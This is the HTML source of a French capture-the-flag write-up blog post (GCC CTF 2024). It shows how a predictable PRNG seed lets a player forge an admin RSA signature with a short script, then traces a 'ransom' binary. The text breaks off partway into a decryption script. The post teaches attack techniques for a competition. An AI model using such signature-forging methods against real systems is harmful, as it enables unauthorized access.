@@ -1,0 +1,1215 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>GCC 2024- Quelques writeups - </title><meta name="Description" content="Quelques challenges simples"><meta property="og:title" content="GCC 2024- Quelques writeups" />
+<meta property="og:description" content="Quelques challenges simples" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/posts/gcc-ctf/" /><meta property="og:image" content="//localhost:1313/posts/gcc-ctf/featured-image.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-04T14:03:32+01:00" />
+<meta property="article:modified_time" content="2024-03-04T14:03:32+01:00" /><meta property="og:site_name" content="Nu1t" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="//localhost:1313/posts/gcc-ctf/featured-image.png" /><meta name="twitter:title" content="GCC 2024- Quelques writeups"/>
+<meta name="twitter:description" content="Quelques challenges simples"/>
+<meta name="application-name" content="Nu1t">
+<meta name="apple-mobile-web-app-title" content="Nu1t"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/posts/gcc-ctf/" /><link rel="prev" href="//localhost:1313/posts/cheatsheet/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "GCC 2024- Quelques writeups",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/posts\/gcc-ctf\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/\/localhost:1313\/posts\/gcc-ctf\/featured-image.png",
+                            "width":  3000 ,
+                            "height":  2999 
+                        }],"genre": "posts","keywords": "android, crypto, reverse, machine learning, misc, web","wordcount":  2648 ,
+        "url": "\/\/localhost:1313\/posts\/gcc-ctf\/","datePublished": "2024-03-04T14:03:32+01:00","dateModified": "2024-03-04T14:03:32+01:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nu1t"
+            },"description": "Quelques challenges simples"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">Nu1t</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item active" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">Nu1t</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">GCC 2024- Quelques writeups</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nu1t</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-03-04">2024-03-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2648 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/gcc-ctf/featured-image.png"
+        data-srcset="/posts/gcc-ctf/featured-image.png, /posts/gcc-ctf/featured-image.png 1.5x, /posts/gcc-ctf/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/posts/gcc-ctf/featured-image.png"
+        title="Quelques challenges simples" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#gcc-news">GCC News</a>
+          <ul>
+            <li><a href="#signature">Signature</a></li>
+            <li><a href="#utilisation-dun-prng">Utilisation d&rsquo;un PRNG</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a>
+      <ul>
+        <li><a href="#ransom">Ransom</a></li>
+        <li><a href="#gcc-chat-1">GCC Chat 1</a>
+          <ul>
+            <li><a href="#analyse-statique">Analyse statique</a></li>
+            <li><a href="#reverse-du-bytecode-hermes">Reverse du bytecode Hermes</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#dga">DGA</a></li>
+        <li><a href="#gcc-online">GCC Online</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#free-cider">Free Cider</a>
+          <ul>
+            <li><a href="#idor">IDOR</a></li>
+            <li><a href="#password-reset-poisoning">Password reset poisoning</a></li>
+          </ul>
+        </li>
+        <li><a href="#free-chat">Free Chat</a>
+          <ul>
+            <li><a href="#lfi">LFI</a></li>
+            <li><a href="#wildcard-dns--ssrf">Wildcard DNS &amp; SSRF</a></li>
+            <li><a href="#locate-varcachelocatelocatedb">Locate: /var/cache/locate/locatedb</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="introduction">Introduction</h2>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Remarque<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Tous les challenges et solutions sont disponibles ici: <a href="https://github.com/GCC-ENSIBS/GCC-CTF-2024" target="_blank" rel="noopener noreffer ">https://github.com/GCC-ENSIBS/GCC-CTF-2024</a> !</div>
+        </div>
+    </div>
+<p>Voici quelques notes sur certains challenges résolus ou étudiés par mon équipe.
+Nous n&rsquo;étions pas particulièrement disponibles, et séchions sur certaines catégories (osint,web3,pwn), cependant les défis étaient originaux , de qualité et comprenaient souvent plusieurs solutions non prévues par les auteurs.</p>
+<p>Finalement, nous avons pu obtenir un classement respectable (~15%) en nous focalisant sur nos domaines de préférences.</p>
+<h2 id="crypto">Crypto</h2>
+<h3 id="gcc-news">GCC News</h3>
+<h4 id="signature">Signature</h4>
+<p>Le but de ce challenge est d&rsquo;accéder à la page <code>/news</code> du site une fois connecté.</p>
+<p>Une fois notre utilisateur <code>a</code> crée, nous disposons d&rsquo;un token et d&rsquo;un message passés en <code>GET</code> pour cette route:</p>
+<p><code>http://worker04.gcc-ctf.com:14307/news?token=9[...]03&amp;message=eydhJzogW0ZhbHNlXX0%3D</code>, avec</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo -ne eydhJzogW0ZhbHNlXX0= | base64 -d
+</span></span><span class="line"><span class="cl">{&#39;a&#39;: [False]}base64: entrée incorrecte
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le message étant formatté en JSON <code>{'utilisateur': [False]}</code>, on se doute qu&rsquo;un parseur vérifiera si la valeur associée au nom utilisateur vaut True mais il faut générer un token valide pour ce message.</p>
+<p>Regardons le code source d&rsquo;un peu plus près:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/news&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">news</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">signature</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">message</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">message</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;False&#34;</span><span class="p">,</span> <span class="s2">&#34;false&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;True&#34;</span><span class="p">,</span> <span class="s2">&#34;true&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">keys</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">subscribe</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">values</span><span class="p">())[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">signature</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">is_sign</span> <span class="o">=</span> <span class="n">verify_signature</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">message</span><span class="p">),</span> <span class="n">public_key_users</span><span class="p">[</span><span class="n">username</span><span class="p">],</span> <span class="n">signature</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">is_sign</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;news.html&#39;</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">subscribe</span><span class="o">=</span><span class="n">subscribe</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="n">reason</span><span class="o">=</span><span class="s1">&#39;unauthorized&#39;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notre token est en fait une <strong>signature RSA</strong>, dont les clés publiques et privées sont générées à partir du message, que l&rsquo;on contrôle et qui semble unique (pas de SGBD pour stocker les tokens) &hellip;
+Pour rappel, en notant (n,e) la clé publique, (n,d) la clé privée et s la signature:</p>
+<p>$$s = m^{d}[n]$$</p>
+<p>C&rsquo;est exactement le travail de <code>verify_signature</code>. Mais comment fonctionne <code>generate_key(username)</code>?</p>
+<h4 id="utilisation-dun-prng">Utilisation d&rsquo;un PRNG</h4>
+<p>Le module n est en fait crée à partir d&rsquo;une décomposition en facteurs premiers, puis l&rsquo;indicatrice d&rsquo;Euler ainsi que la clé privée en sont déduites.
+Comme on s&rsquo;en doutait, chaque paire de clés ne dépendant que du paramètre <code>username</code>, la faille réside dans la génération de ces facteurs.
+En effet le module <code>random</code> est utilisé comme <strong>PRNG</strong> pour initialiser la seed (graine) générant ces facteurs:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">	<span class="n">s</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">username</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># username controlled</span>
+</span></span><span class="line"><span class="cl">	<span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="c1"># predictable seed</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="n">math</span><span class="o">.</span><span class="n">gcd</span><span class="p">(</span><span class="n">phi</span><span class="p">,</span><span class="n">e</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">n</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">		<span class="n">factors</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">while</span> <span class="n">length</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2048</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">temp_n</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span> <span class="c1"># deterministic factors</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="n">isPrime</span><span class="p">(</span><span class="n">temp_n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">				<span class="n">n</span> <span class="o">*=</span> <span class="n">temp_n</span>
+</span></span><span class="line"><span class="cl">				<span class="n">factors</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">temp_n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">phi</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">factors</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">phi</span> <span class="o">*=</span> <span class="p">(</span><span class="n">f</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Pour plus d&rsquo;information sur <strong>PRNG-RSA</strong>, voir <a href="https://www.0x0ff.info/2014/prng-et-generateur-de-cle/" target="_blank" rel="noopener noreffer ">https://www.0x0ff.info/2014/prng-et-generateur-de-cle/</a> .
+Grossièrement, il suffira de réutiliser la génération de clés qui nous sont fournies:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">e</span><span class="p">),</span> <span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">d</span><span class="p">)</span> <span class="o">=</span> <span class="n">generate_key</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">message</span> <span class="o">=</span> <span class="nb">str</span><span class="p">({</span><span class="s1">&#39;admin&#39;</span><span class="p">:</span> <span class="p">[</span><span class="kc">True</span><span class="p">]});</span><span class="nb">print</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">hashed_message</span> <span class="o">=</span> <span class="n">hash_string_sha256</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">signature</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">hashed_message</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">);</span> <span class="nb">print</span><span class="p">(</span><span class="n">signature</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Il ne reste plus qu&rsquo;à accéder à <code>/news</code> avec ces paramètres : <code>http://worker04.gcc-ctf.com:14307/news?token=[signature]03&amp;message=[message]</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./news.png"
+        data-srcset="./news.png, ./news.png 1.5x, ./news.png 2x"
+        data-sizes="auto"
+        alt="./news.png"
+        title="news" /></p>
+<h2 id="reverse">Reverse</h2>
+<h3 id="ransom">Ransom</h3>
+<p>D&rsquo;après l&rsquo;énonce, nous disposons d&rsquo;un binaire <code>ransom</code> étrange, chiffrant un certain fichier en <code>secret.txt.enc</code> sur une machine Debian:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file ransom 
+</span></span><span class="line"><span class="cl">ransom: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, not stripped
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En éxécutant ce binaire, le contenu de <code>secret.txt</code>, s&rsquo;il existe est chiffré dans <code>secrets.txt.enc</code>.
+Pour s&rsquo;en apercevoir, il est préférable de débugger le programme avec GDB, ou de tracer les appels systèmes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">strace ./ransom 
+</span></span><span class="line"><span class="cl">execve<span class="o">(</span><span class="s2">&#34;./ransom&#34;</span>, <span class="o">[</span><span class="s2">&#34;./ransom&#34;</span><span class="o">]</span>, 0x7ffeffec1480 /* <span class="m">64</span> vars */<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span> Process <span class="nv">PID</span><span class="o">=</span><span class="m">230712</span> runs in <span class="m">32</span> bit mode. <span class="o">]</span>
+</span></span><span class="line"><span class="cl">strace: WARNING: Proper structure decoding <span class="k">for</span> this personality is not supported, please consider building strace with mpers support enabled.
+</span></span><span class="line"><span class="cl">open<span class="o">(</span><span class="s2">&#34;secrets.txt&#34;</span>, O_RDONLY<span class="o">)</span>           <span class="o">=</span> -1 ENOENT <span class="o">(</span>Aucun fichier ou dossier de ce nom<span class="o">)</span>
+</span></span><span class="line"><span class="cl">read<span class="o">(</span>-2, 0x804a1a2, 1024<span class="o">)</span>               <span class="o">=</span> -1 EBADF <span class="o">(</span>Mauvais descripteur de fichier<span class="o">)</span>
+</span></span><span class="line"><span class="cl">close<span class="o">(</span>-2<span class="o">)</span>                               <span class="o">=</span> -1 EBADF <span class="o">(</span>Mauvais descripteur de fichier<span class="o">)</span>
+</span></span><span class="line"><span class="cl">uname<span class="o">({</span><span class="nv">sysname</span><span class="o">=</span><span class="s2">&#34;Linux&#34;</span>, <span class="nv">nodename</span><span class="o">=</span><span class="s2">&#34;night-20b7s2ex01&#34;</span>, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">creat<span class="o">(</span><span class="s2">&#34;secrets.txt.enc&#34;</span>, 0666<span class="o">)</span>          <span class="o">=</span> <span class="m">3</span>
+</span></span><span class="line"><span class="cl">write<span class="o">(</span>3, <span class="s2">&#34;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>, 18<span class="o">)</span> <span class="o">=</span> <span class="m">18</span>
+</span></span><span class="line"><span class="cl">close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">exit<span class="o">(</span>0<span class="o">)</span>                                 <span class="o">=</span> ?
+</span></span><span class="line"><span class="cl">+++ exited with <span class="m">0</span> +++
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nous avons donc affaire à un <strong>keygen</strong> en assembleur x86 comme l&rsquo;indique le challenge.
+En 32 bits, plusieurs conventions d&rsquo;appel existent, ici le ret est fait dans <code>eax</code> puis le syscall correspondant est effectué avec <code>int 80</code>, dans la convention FASTCALL.</p>
+<p>Afin de faire un peu d&rsquo;analyse statique, on peut penser à Ghidra, plutôt efficace pour traiter du C ainsi que diverses architectures (ARM,MIPS) mais seules 2 des 4 fonctions présentes seront décompilées, en plus de noter les syscall avec <code>swi</code> (ARM) sans plus de détail.
+<strong>Binary Ninja</strong> facilite alors le travail:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./graph_secret.png"
+        data-srcset="./graph_secret.png, ./graph_secret.png 1.5x, ./graph_secret.png 2x"
+        data-sizes="auto"
+        alt="./graph_secret.png"
+        title="graph" /></p>
+<p>En s&rsquo;armant de documentation (<a href="https://x86.syscall.sh/%29" target="_blank" rel="noopener noreffer ">https://x86.syscall.sh/)</a>, on comprend que la longue suite de <code>inc eax</code> dans la fin du premier bloc correspond au <code>uname</code> (syscall <code>0x7a</code>=<code>122</code>), puis que le mot de passe <code>secret_content</code> lu et stocké dans <code>esi</code> en <code>0x0804903c</code> puis stocké dans <code>eax</code> en <code>0x080490c9</code> subit une comparaison et un xor:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./secret.png"
+        data-srcset="./secret.png, ./secret.png 1.5x, ./secret.png 2x"
+        data-sizes="auto"
+        alt="./secret.png"
+        title="secret" /></p>
+<p>En affichant la valeur contenue à l&rsquo;addresse de <code>data_804a05d</code>, on se rend compte qu&rsquo;il s&rsquo;agit du résultat du <code>uname</code> appliqué sur notre machine.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./bp.png"
+        data-srcset="./bp.png, ./bp.png 1.5x, ./bp.png 2x"
+        data-sizes="auto"
+        alt="./bp.png"
+        title="bp" /></p>
+<p>Nous allons donc reverser cet algorithme grâce à cette <strong>clé</strong>, connaissant le format du flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dechiffre_vigenere</span><span class="p">(</span><span class="n">texte_chiffre</span><span class="p">,</span> <span class="n">cle</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cle_int</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cle</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dechiffre_texte</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        
